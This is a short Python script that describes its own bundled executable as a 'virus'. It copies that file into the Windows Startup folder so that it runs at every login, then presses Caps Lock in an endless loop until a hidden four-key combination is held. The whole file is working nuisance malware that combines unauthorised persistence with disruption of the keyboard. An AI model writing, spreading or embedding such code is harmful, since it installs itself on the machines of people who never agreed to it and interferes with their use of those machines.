import os
import sys
import shutil
import pyautogui
import keyboard

def resource_path(r_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, r_path)

virus = resource_path('WindowStartup.exe')

user = os.getlogin()

path = os.path.join(r'C:\Users',user,'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')

if(virus != os.path.join(path, 'WindowStartup.py')):
    shutil.copy(virus, path)

running = True
while running == True:
    pyautogui.press('capslock', interval=0.15)
    if keyboard.is_pressed('q') and keyboard.is_pressed('w') and keyboard.is_pressed('o') and keyboard.is_pressed('p'):
        running = False
